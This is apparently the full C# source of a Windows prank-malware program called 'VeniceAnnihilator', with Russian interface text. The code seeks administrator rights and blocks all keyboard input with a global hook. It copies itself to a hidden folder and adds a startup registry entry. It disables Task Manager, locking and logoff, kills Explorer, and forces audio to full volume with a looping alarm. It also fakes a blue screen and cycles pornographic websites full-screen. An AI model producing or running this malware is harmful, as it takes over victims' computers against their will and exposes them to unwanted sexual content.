using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace VeniceAnnihilator
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            bool createdNew;
            Mutex m = new Mutex(true, "VeniceAnnihilatorMutex_v1", out createdNew);
            if (!createdNew)
            {
                Thread.Sleep(1600);
                bool cn2;
                m = new Mutex(true, "VeniceAnnihilatorMutex_v1", out cn2);
                if (!cn2) return;
            }

            if (Elevate()) return;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Annihilator());
            GC.KeepAlive(m);
        }

        static bool Elevate()
        {
            try
            {
                WindowsPrincipal p = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                if (p.IsInRole(WindowsBuiltInRole.Administrator)) return false;
                ProcessStartInfo psi = new ProcessStartInfo(Application.ExecutablePath);
                psi.Verb = "runas";
                psi.UseShellExecute = true;
                Process.Start(psi);
                return true;
            }
            catch { return false; }
        }
    }

    class Annihilator : Form
    {
        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("winmm.dll")]
        static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
        [DllImport("kernel32.dll")]
        static extern uint SetThreadExecutionState(uint esFlags);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100, WM_KEYUP = 0x101, WM_SYSKEYDOWN = 0x104, WM_SYSKEYUP = 0x105;
        const uint SND_FILENAME = 0x20000, SND_ASYNC = 1, SND_LOOP = 8, SND_NODEFAULT = 2;

        const string RUN_KEY = @"Software\Microsoft\Windows\CurrentVersion\Run";
        const string POL     = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        const string POLX    = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
        const string ADV     = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
        const string FEAT    = @"Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION";

        const string GARBAGE = "!@#$%^&*<>/\\|01ЖХЦЪЭ█▓▒░ΔΣΩ日";

        static readonly string[] SITES = new string[] {
            "https://www.pornpics.com/",
            "https://www.imagefap.com/",
            "https://www.eporner.com/",
            "https://www.txxx.com/",
            "https://www.xvideos.com/",
            "https://www.pornhub.com/"
        };

        IntPtr hook = IntPtr.Zero;
        LowLevelKeyboardProc hookProc;
        Random rnd = new Random();

        System.Windows.Forms.Timer uiTimer, glitchTimer, shakeTimer, seqTimer, navTimer;
        Label glitch, hint;
        Panel bar, bsod;
        WebBrowser wb;
        List<Form> covers = new List<Form>();

        bool escPressed = false;
        DateTime escStart = DateTime.MinValue;
        bool exiting = false;
        int t = 0, siteIdx = 0;
        float oldVol = -1f;
        int oldMute = 0;
        string destPath = "";

        public Annihilator()
        {
            SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
            FormBorderStyle = FormBorderStyle.None;
            StartPosition = FormStartPosition.Manual;
            Bounds = Screen.PrimaryScreen.Bounds;
            TopMost = true;
            ShowInTaskbar = false;
            BackColor = Color.Black;
            Text = "Venice Annihilator";

            glitch = new Label();
            glitch.Dock = DockStyle.Fill;
            glitch.TextAlign = ContentAlignment.MiddleCenter;
            glitch.Font = new Font("Consolas", 72f, FontStyle.Bold);
            glitch.ForeColor = Color.FromArgb(220, 20, 20);
            glitch.BackColor = Color.Black;
            glitch.Text = "...";
            Controls.Add(glitch);

            bar = new Panel();
            bar.Dock = DockStyle.Bottom;
            bar.Height = 26;
            bar.BackColor = Color.Black;
            hint = new Label();
            hint.Dock = DockStyle.Fill;
            hint.TextAlign = ContentAlignment.MiddleCenter;
            hint.Font = new Font("Consolas", 10f, FontStyle.Bold);
            hint.ForeColor = Color.FromArgb(80, 80, 80);
            hint.Text = "ESC (3 сек) = выйти";
            bar.Controls.Add(hint);
            Controls.Add(bar);
            bar.BringToFront();

            bsod = new Panel();
            bsod.Dock = DockStyle.Fill;
            bsod.BackColor = Color.FromArgb(0, 110, 210);
            bsod.Visible = false;
            Label b = new Label();
            b.Dock = DockStyle.Fill;
            b.Font = new Font("Segoe UI", 22f);
            b.ForeColor = Color.White;
            b.TextAlign = ContentAlignment.MiddleLeft;
            b.Padding = new Padding(70, 0, 70, 0);
            b.Text = ":(\r\n\r\nКомпьютер столкнулся с проблемой и будет перезагружен.\r\n\r\nКод остановки: VENICE_ANNIHILATOR\r\n\r\nУдерживай ESC 3 секунды, чтобы всё вернуть.";
            bsod.Controls.Add(b);
            Controls.Add(bsod);
            bsod.BringToFront();
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            SetThreadExecutionState(0x80000000u | 1u);

            try
            {
                hookProc = new LowLevelKeyboardProc(HookProc);
                hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, GetModuleHandle(null), 0);
            }
            catch { }

            try { ApplyRegistry(); } catch { }
            try { SaveVolume(); SetVolume(1f); } catch { }

            foreach (Screen s in Screen.AllScreens)
            {
                if (s.Bounds.Equals(Screen.PrimaryScreen.Bounds)) continue;
                Form f = new Form();
                f.FormBorderStyle = FormBorderStyle.None;
                f.StartPosition = FormStartPosition.Manual;
                f.Bounds = s.Bounds;
                f.TopMost = true;
                f.ShowInTaskbar = false;
                f.BackColor = Color.Black;
                Label l = new Label();
                l.Dock = DockStyle.Fill;
                l.TextAlign = ContentAlignment.MiddleCenter;
                l.Font = new Font("Consolas", 40f, FontStyle.Bold);
                l.ForeColor = Color.FromArgb(200, 0, 0);
                l.Text = "СМОТРИ НА ПЕРВЫЙ МОНИТОР";
                f.Controls.Add(l);
                f.Show();
                covers.Add(f);
            }

            uiTimer = new System.Windows.Forms.Timer(); uiTimer.Interval = 100; uiTimer.Tick += UiTick; uiTimer.Start();
            glitchTimer = new System.Windows.Forms.Timer(); glitchTimer.Interval = 70; glitchTimer.Tick += GlitchTick;
            shakeTimer = new System.Windows.Forms.Timer(); shakeTimer.Interval = 40; shakeTimer.Tick += ShakeTick;
            seqTimer = new System.Windows.Forms.Timer(); seqTimer.Interval = 1000; seqTimer.Tick += SeqTick; seqTimer.Start();
            navTimer = new System.Windows.Forms.Timer(); navTimer.Interval = 22000; navTimer.Tick += NavTick;
        }

        IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = wParam.ToInt32();
                int vk = Marshal.ReadInt32(lParam);
                if (vk == 0x1B)
                {
                    if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
                    {
                        if (!escPressed) { escPressed = true; escStart = DateTime.Now; }
                    }
                    else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
                    {
                        escPressed = false;
                    }
                }
                return (IntPtr)1;
            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        void UiTick(object s, EventArgs e)
        {
            if (exiting) return;
            try { if (!TopMost) TopMost = true; } catch { }
            try { SetForegroundWindow(Handle); } catch { }

            if (escPressed && (DateTime.Now - escStart).TotalMilliseconds >= 3000)
            {
                hint.Text = "ВОССТАНАВЛИВАЮ...";
                ExitAll();
            }
            else if (escPressed)
            {
                int pct = (int)((DateTime.Now - escStart).TotalMilliseconds / 30);
                hint.Text = "ДЕРЖИ... " + pct + "%";
            }
            else hint.Text = "ESC (3 сек) = выйти";
        }

        void GlitchTick(object s, EventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            int n = 16 + rnd.Next(22);
            for (int i = 0; i < n; i++) sb.Append(GARBAGE[rnd.Next(GARBAGE.Length)]);
            glitch.Text = sb.ToString();
            glitch.ForeColor = rnd.Next(3) == 0 ? Color.White : Color.FromArgb(220, 20, 20);
        }

        void ShakeTick(object s, EventArgs e)
        {
            Rectangle b = Screen.PrimaryScreen.Bounds;
            Location = new Point(b.X + rnd.Next(-22, 22), b.Y + rnd.Next(-22, 22));
        }

        void SeqTick(object s, EventArgs e)
        {
            t++;
            if (t == 2) Scream();
            if (t == 7) ShowPorn();
            if (t == 9) KillExplorer();
            if (t > 12 && t % 25 == 0) FlashBsod();
        }

        void Scream()
        {
            glitchTimer.Start();
            shakeTimer.Start();
            string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Media");
            string wav = Path.Combine(dir, "Alarm03.wav");
            if (!File.Exists(wav)) wav = Path.Combine(dir, "Alarm01.wav");
            if (File.Exists(wav))
                PlaySound(wav, IntPtr.Zero, SND_FILENAME | SND_ASYNC | SND_LOOP | SND_NODEFAULT);
            else
                try { System.Media.SystemSounds.Hand.Play(); } catch { }
            try { SetVolume(1f); } catch { }
        }

        void ShowPorn()
        {
            try
            {
                shakeTimer.Stop();
                glitchTimer.Stop();
                Bounds = Screen.PrimaryScreen.Bounds;
                glitch.Visible = false;

                wb = new WebBrowser();
                wb.Dock = DockStyle.Fill;
                wb.ScriptErrorsSuppressed = true;
                wb.WebBrowserShortcutsEnabled = false;
                wb.IsWebBrowserContextMenuEnabled = false;
                wb.AllowWebBrowserDrop = false;
                wb.ScrollBarsEnabled = false;
                Controls.Add(wb);
                wb.BringToFront();
                bar.BringToFront();
                bsod.BringToFront();

                NavigateNext();
                navTimer.Start();
            }
            catch { }
        }

        void NavigateNext()
        {
            try
            {
                if (wb == null) return;
                wb.Navigate(SITES[siteIdx % SITES.Length]);
                siteIdx++;
            }
            catch { }
        }

        void NavTick(object s, EventArgs e) { NavigateNext(); }

        void FlashBsod()
        {
            if (bsod.Visible) return;
            bsod.Visible = true;
            bsod.BringToFront();
            System.Windows.Forms.Timer tt = new System.Windows.Forms.Timer();
            tt.Interval = 1700;
            tt.Tick += delegate { tt.Stop(); tt.Dispose(); bsod.Visible = false; };
            tt.Start();
        }

        void KillExplorer()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("explorer"))
                {
                    try { p.Kill(); } catch { }
                }
            }
            catch { }
        }

        // ---------- реестр ----------

        void ApplyRegistry()
        {
            try
            {
                destPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft\\Windows\\venice_annihilator.exe");
            }
            catch { }

            try
            {
                if (!string.IsNullOrEmpty(destPath) && !File.Exists(destPath))
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(destPath));
                    File.Copy(Application.ExecutablePath, destPath, true);
                }
            }
            catch { }

            string target = (string.IsNullOrEmpty(destPath) || !File.Exists(destPath))
                ? Application.ExecutablePath : destPath;

            try { using (RegistryKey k = Registry.CurrentUser.CreateSubKey(RUN_KEY)) k.SetValue("VeniceAnnihilator", "\"" + target + "\""); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.CreateSubKey(POL)) { k.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord); k.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord); } } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.CreateSubKey(POLX)) k.SetValue("NoLogoff", 1, RegistryValueKind.DWord); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.CreateSubKey(ADV)) k.SetValue("HideIcons", 1, RegistryValueKind.DWord); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.CreateSubKey(FEAT)) k.SetValue(Path.GetFileName(Application.ExecutablePath), 11001, RegistryValueKind.DWord); } catch { }
        }

        void RestoreRegistry()
        {
            try { using (RegistryKey k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true)) if (k != null) k.DeleteValue("VeniceAnnihilator", false); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.OpenSubKey(POL, true)) if (k != null) { k.DeleteValue("DisableTaskMgr", false); k.DeleteValue("DisableLockWorkstation", false); } } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.OpenSubKey(POLX, true)) if (k != null) k.DeleteValue("NoLogoff", false); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.OpenSubKey(ADV, true)) if (k != null) k.DeleteValue("HideIcons", false); } catch { }
            try { using (RegistryKey k = Registry.CurrentUser.OpenSubKey(FEAT, true)) if (k != null) k.DeleteValue(Path.GetFileName(Application.ExecutablePath), false); } catch { }
            try
            {
                if (!string.IsNullOrEmpty(destPath) && File.Exists(destPath) &&
                    !string.Equals(destPath, Application.ExecutablePath, StringComparison.OrdinalIgnoreCase))
                    File.Delete(destPath);
            }
            catch { }
        }

        // ---------- звук ----------

        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
        class MMDeviceEnumerator { }

        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator
        {
            int EnumAudioEndpoints(int dataFlow, int stateMask, out IntPtr devices);
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice dev);
        }

        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDevice
        {
            int Activate(ref Guid iid, int clsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
        }

        [ComImport, Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioEndpointVolume
        {
            int RegisterControlChangeNotify(IntPtr p);
            int UnregisterControlChangeNotify(IntPtr p);
            int GetChannelCount(out int c);
            int SetMasterVolumeLevel(float db, Guid g);
            int SetMasterVolumeLevelScalar(float f, Guid g);
            int GetMasterVolumeLevel(out float db);
            int GetMasterVolumeLevelScalar(out float f);
            int SetChannelVolumeLevel(uint ch, float db, Guid g);
            int SetChannelVolumeLevelScalar(uint ch, float f, Guid g);
            int GetChannelVolumeLevel(uint ch, out float db);
            int GetChannelVolumeLevelScalar(uint ch, out float f);
            int SetMute(int mute, Guid g);
            int GetMute(out int mute);
        }

        IAudioEndpointVolume GetVolume()
        {
            IMMDeviceEnumerator en = (IMMDeviceEnumerator)(new MMDeviceEnumerator());
            IMMDevice dev;
            en.GetDefaultAudioEndpoint(0, 1, out dev);
            Guid iid = typeof(IAudioEndpointVolume).GUID;
            object o;
            dev.Activate(ref iid, 23, IntPtr.Zero, out o);
            GC.KeepAlive(dev);
            return (IAudioEndpointVolume)o;
        }

        void SaveVolume()
        {
            try
            {
                IAudioEndpointVolume v = GetVolume();
                Guid g = Guid.Empty;
                int mu; float f;
                v.GetMute(out mu);
                v.GetMasterVolumeLevelScalar(out f);
                oldMute = mu; oldVol = f;
                GC.KeepAlive(v);
            }
            catch { }
        }

        void SetVolume(float f)
        {
            try
            {
                IAudioEndpointVolume v = GetVolume();
                Guid g = Guid.Empty;
                v.SetMute(0, g);
                v.SetMasterVolumeLevelScalar(f, g);
                GC.KeepAlive(v);
            }
            catch { }
        }

        // ---------- выход ----------

        void ExitAll()
        {
            if (exiting) return;
            exiting = true;

            try { uiTimer.Stop(); seqTimer.Stop(); navTimer.Stop(); glitchTimer.Stop(); shakeTimer.Stop(); } catch { }
            try { if (hook != IntPtr.Zero) UnhookWindowsHookEx(hook); } catch { }
            try { PlaySound(null, IntPtr.Zero, 0); } catch { }
            try
            {
                if (oldVol >= 0)
                {
                    IAudioEndpointVolume v = GetVolume();
                    Guid g = Guid.Empty;
                    v.SetMasterVolumeLevelScalar(oldVol, g);
                    v.SetMute(oldMute, g);
                    GC.KeepAlive(v);
                }
            }
            catch { }
            try { RestoreRegistry(); } catch { }
            try { SetThreadExecutionState(0x80000000u); } catch { }
            try { foreach (Form f in covers) f.Close(); } catch { }
            try { Process.Start("explorer.exe"); } catch { }
            Close();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (!exiting) { e.Cancel = true; return; }
            base.OnFormClosing(e);
        }
    }
}
